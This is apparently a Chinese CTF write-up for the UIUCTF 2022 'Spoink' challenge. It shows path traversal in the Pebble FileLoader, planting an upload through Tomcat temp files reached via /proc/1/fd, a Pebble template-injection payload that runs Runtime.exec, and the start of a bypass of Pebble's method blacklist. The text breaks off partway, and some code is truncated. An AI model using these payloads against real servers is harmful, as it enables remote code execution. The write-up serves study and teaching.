2022UIUCTF-Spoink(pebble最新模板注⼊) 
写在前⾯
之前周末忙着强⽹杯，对这道题只做了⼀半就搁置下来了，最后卡在绕过最新pebble模板引擎
RCE那⾥，今天抽空来继续进⾏剩下的分析，正好题⽬⾥有⼏个在现实场景当中能⽤的trick顺
便也分享了
题⽬环境分析
也是挺不错题⽬直接给了docker环境便于本地搭建，同时设置了权限需要执⾏./getflag才能获
取获得flag
FROM openjdk:18-slim-bullseye
RUN mkdir /usr/src/app
WORKDIR /usr/src/app
# create user
RUN groupadd chalusr
RUN useradd -ms /bin/bash -g chalusr chalusr
COPY spoink/target/spoink-0.0.1-SNAPSHOT-spring-boot.jar ./
COPY spoink/public ./public
COPY spoink/templates ./templates
COPY getflag ./
RUN chmod 111 ./getflag
USER chalusr
路由只有⼀个，根据参数x返回指定模板，刚看到这⾥的时候其实有点懵，毕竟很少见到只给
⼀个路由的代码
不过我很快关注到了⼀个application.properties当中⼀个很有趣的点，也就是这⾥没有后缀，因
此想到了⼀个⽬录穿越的可能
正⽂
⽬录穿越
CMD ["java", "-jar", "/usr/src/app/spoink-0.0.1-SNAPSHOT-spring-boot.jar"]
@Controller
public class HomeController {
    public HomeController() {
    }
    @RequestMapping({"/"})
    public String getTemplate(@RequestParam("x") Optional 
template, Model model) {
        return (String)template.orElse("home.pebble");
    }
}
pebble.prefix = templates
pebble.suffix =
为什么我说上⾯那个点很有趣，其实就是第⼀个想分享的trick，路径穿越，简单来说pebble当
中有两个loader⼀个是classpathloader，另⼀个是fileloader，优先会在classpath下尝试加载模板
⽂件，如果寻找不到则使⽤fileloader尝试加载模板⽂件，其他调⽤栈不是很重要这⾥就不多提
了
既然想实现任意⽂件读那第⼀个就别想了，我们来看第⼆个，它在
com.mitchellbosecke.pebble.loader.FileLoader#getFile最终加载模板⽂件内容
可以很明显看到这⾥没有做路径限制，导致我们可以进⾏跨⽬录读任意⽂件
结果如下
RCE攻击路径初步构建
因此我们便能成功想到⼀条能RCE的攻击路径
1. 上传带恶意内容的模板⽂件到⽬标服务器
2. 利⽤LFI读取这个模板并RCE
如何上传⽂件？上传了如何获取？
但是这⾥就遇到第⼀个难点，如何上传⽂件？这⾥路由当中并没有上传⽂件的功能点
怎么办？其实很简单，我们也知道，我们的Spring MVC框架是围绕DispatcherServlet来设计
的，这个Servlet会把请求分发给各个处理器，并⽀持可配置的处理器映射、视图渲染、本地
化、时区与主题渲染和 ⽂件上传 等功能，好了我都圈出来重点了
在这过程当中它会检查这是否是⼀个表单请求
正好我们也知道spring默认使⽤内置的tomcat引擎，
在处理表单的内容当中这会调⽤ org.apache.catalina.connector.Request#getParts
去处理解析内容，⽽这在之前的⽂章Tomcat⽂件上传流量层⾯系列⽂章当中也提到过，遗忘
的可以去我的博客考古
废话不多说，类似php的处理⼀样，它会先将上传的⽂件保存到⼀个临时⽬录再最终复制到⽬
标⽂件夹，临时⽂件夹的获取在哪⾥，
在 org.apache.catalina.connector.Request#parseParts
发现是通过 javax.servlet.MultipartConfigElement#getLocation 函数获取到保存到
临时路径
不难看到这⾥是空对吧，也就是默认值(默认的话后⾯会存到/tmp⽬录下)，顺便多提⼀下，哪
⾥可以设置这个location呢
在spring的启动过程当中，会根据 spring.servlet.multipart.location 的值设置这个内
容，具体可以⾃⾏去参考org.springframework.boot.autoconfigure.web.servlet.MultipartProperties
@ConfigurationProperties(
    prefix = "spring.servlet.multipart",
    ignoreUnknownFields = false
)
public class MultipartProperties {
    private boolean enabled = true;
    private String location;
    private DataSize maxFileSize = DataSize.ofMegabytes(1L);
    private DataSize maxRequestSize = DataSize.ofMegabytes(10L);
    private DataSize fileSizeThreshold = DataSize.ofBytes(0L);
    private boolean resolveLazily = false;
    public MultipartProperties() {
    }
    public boolean getEnabled() {
        return this.enabled;
    }
    public void setEnabled(boolean enabled) {
        this.enabled = enabled;
    }
    public String getLocation() {
        return this.location;
    }
    public void setLocation(String location) {
        this.location = location;
    }
    public DataSize getMaxFileSize() {
        return this.maxFileSize;
    }
    public void setMaxFileSize(DataSize maxFileSize) {
        this.maxFileSize = maxFileSize;
    }
    public DataSize getMaxRequestSize() {
        return this.maxRequestSize;
    }
ok回到正⽂，如果这为空，就会保存到默认路径，也就
是 javax.servlet.context.tempdir ，实际上就是在/tmp⽬录下
    public void setMaxRequestSize(DataSize maxRequestSize) {
        this.maxRequestSize = maxRequestSize;
    }
    public DataSize getFileSizeThreshold() {
        return this.fileSizeThreshold;
    }
    public void setFileSizeThreshold(DataSize fileSizeThreshold) {
        this.fileSizeThreshold = fileSizeThreshold;
    }
    public boolean isResolveLazily() {
        return this.resolveLazily;
    }
    public void setResolveLazily(boolean resolveLazily) {
        this.resolveLazily = resolveLazily;
    }
    public MultipartConfigElement createMultipartConfig() {
        MultipartConfigFactory factory = new MultipartConfigFactory();
        PropertyMapper map = 
PropertyMapper.get().alwaysApplyingWhenNonNull();
 map.from(this.fileSizeThreshold).to(factory::setFileSizeThreshold);
        map.from(this.location).whenHasText().to(factory::setLocation);
        map.from(this.maxRequestSize).to(factory::setMaxRequestSize);
        map.from(this.maxFileSize).to(factory::setMaxFileSize);
        return factory.createMultipartConfig();
    }
}
这⾥调试可以看到将会保存在这个看着就不能爆破的⽂件夹下，
且不说前⾯这个又臭又长的⽂件夹，在最终⽣成临时⽂件时
org.apache.tomcat.util.http.fileupload.disk.DiskFileItem#getTempFile
还有靠UID随机⽣成的⽂件名，真的是不怕⿇烦
try {
  String locationStr = mce.getLocation();
  File location;
  if (locationStr != null && locationStr.length() != 0) {
    location = new File(locationStr);
    if (!location.isAbsolute()) {
      location = (new 
File((File)context.getServletContext().getAttribute("javax.servlet.context
.tempdir"), locationStr)).getAbsoluteFile();
    }
  } else {
    location = 
(File)context.getServletContext().getAttribute("javax.servlet.context.temp
dir");
  }
不过当然我们肯定是有办法的啦，别忘了有个东西叫⽂件描述符，这玩意⼉是啥我想⼤家都
知道，因此我们可以通过上传⼤⽂件多线程狂轰乱炸，burp都给我冲起来！不得不说狂轰乱炸
法yyds！按理说上传完了以后这玩意⼉就应该关闭，结果我发现我停⽌后，去和yzddmr6吹⽜
⼀分钟都还在。
当然其实还可以通过curl命令的--limit-rate参数来限制HTTP请求和回应的带宽，但我觉得burp
狂轰乱炸更适合我.
顺便多提⼀句你可能会好奇为什么⼀定是 /proc/1/fd ，因为这是在docker⾥⾯，之前看
docker逃逸的时候看到的，⽐如这篇⽂章虽然没提到原因：Determine if a Process Runs Inside 
a Container
protected File getTempFile() {
  if (this.tempFile == null) {
    File tempDir = this.repository;
    if (tempDir == null) {
      tempDir = new File(System.getProperty("java.io.tmpdir"));
    }
    String tempFileName = String.format("upload_%s_%s.tmp", UID, 
getUniqueId());
    this.tempFile = new File(tempDir, tempFileName);
  }
  return this.tempFile;
}
curl --limit-rate 1k -X POST http://vps:1234 -F "file=@/tmp/1.txt"
之后就是如何实现模板注⼊实现RCE了
利⽤现有环境Bypass最新版Pebble模板引擎限制
⽹上随便抄了⼀个看起来最新的
结果命令⾏⼤⼤的问号？然后想到了这是最新版修复了之前的问题
根据报错内容的显⽰，接下来我们看看具体做的哪些限制，可以看到够恶⼼的不能是下⾯这
么多类的实例？？？并且能调⽤FORBIDDEN_METHODS 当中的⽅法，特别是判断是否为
Class实例将我们反射的路给断掉了(在这个模板语法当中只能通过xx.class.forName去获取其他
对象)
，剩下代码也很简单就不带着读了
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
public class BlacklistMethodAccessValidator implements 
MethodAccessValidator {
    private static final String[] FORBIDDEN_METHODS = new String[]
{"getClass", "wait", "notify", "notifyAll"};
    public BlacklistMethodAccessValidator() {
    }
如何绕过限制加载任意Class对象
我们也知道Spring 应⽤程序的许多实例都隐式注册为bean，因此我们能不能从bean当中找到⼀
个对象⽽这个对象当中保存了classloader对象，通过获取到它我们就能通过执⾏loadClass加载
到任意对象
    public boolean isMethodAccessAllowed(Object object, Method method) {
        boolean methodForbidden = object instanceof Class || object 
instanceof Runtime || object instanceof Thread || object instanceof 
ThreadGroup || object instanceof System || object instanceof 
AccessibleObject || this.isUnsafeMethod(method);
        return !methodForbidden;
    }
    private boolean isUnsafeMethod(Method member) {
        return this.isAnyOfMethods(member, FORBIDDEN_METHODS);
    }
    private boolean isAnyOfMethods(Method member, String... methods) {
        String[] var3 = methods;
        int var4 = methods.length;
        for(int var5 = 0; var5 , 
java.util.Locale) 当中
可以看到这个map当中存了beans对象，⽽这个beans对象当中存的是那些bean对象，⼀⽅⾯我
们可以直接遍历输出到控制台
另⼀⽅⾯我们也可以直接在代码当中看⼀眼，反正不费事往上看看，可以看到是
在 com.mitchellbosecke.pebble.spring.servlet.PebbleView#addVariablesToMod
el
当中，获取了spring的应⽤程序上下⽂并添加到beans属性当中
因此我们可以通过表达式获取到这个上下⽂当中注册的bean，去尝试寻找⼀些其他的属性来
绕过限制，
因此为了⽅便遍历bean当中的类，我们在原路由前加上获取上下⽂的部分代码
private void addVariablesToModel(Map model, 
HttpServletRequest request, HttpServletResponse response) {
  model.put("beans", new Beans(this.getApplicationContext()));
  model.put("request", request);
  model.put("response", response);
  model.put("session", request.getSession(false));
}
重新启动项⽬并访问可以得到控制台输出
@RequestMapping({"/"})
public String getTemplate(@RequestParam("x") Optional template, 
Model model) {
  ServletContext sss = ((ServletRequestAttributes) 
RequestContextHolder.getRequestAttributes()).getRequest().getSession().get
ServletContext();
  org.springframework.web.context.WebApplicationContext context  = 
org.springframework.web.context.support.WebApplicationContextUtils.getWebA
pplicationContext(sss);
  String[] beanDefinitionNames = context.getBeanDefinitionNames();
  for (String o:beanDefinitionNames) {
    System.out.println(o.toString());
  }
  return (String)template.orElse("home.pebble");
}      
//输出
org.springframework.context.annotation.internalConfigurationAnnotationProc
essor
org.springframework.context.annotation.internalAutowiredAnnotationProcesso
r
org.springframework.context.annotation.internalCommonAnnotationProcessor
org.springframework.context.event.internalEventListenerProcessor
org.springframework.context.event.internalEventListenerFactory
spoinkApplication
org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactor
y
homeController
pebbleLoader
org.springframework.boot.autoconfigure.AutoConfigurationPackages
org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConf
iguration
propertySourcesPlaceholderConfigurer
org.springframework.boot.autoconfigure.websocket.servlet.WebSocketServletA
utoConfiguration$TomcatWebSocketConfiguration
websocketServletWebServerCustomizer
org.springframework.boot.autoconfigure.websocket.servlet.WebSocketServletA
utoConfiguration
org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactory
Configuration$EmbeddedTomcat
tomcatServletWebServerFactory
org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactory
AutoConfiguration
servletWebServerFactoryCustomizer
tomcatServletWebServerFactoryCustomizer
org.springframework.boot.context.properties.ConfigurationPropertiesBinding
PostProcessor
org.springframework.boot.context.internalConfigurationPropertiesBinderFact
ory
org.springframework.boot.context.internalConfigurationPropertiesBinder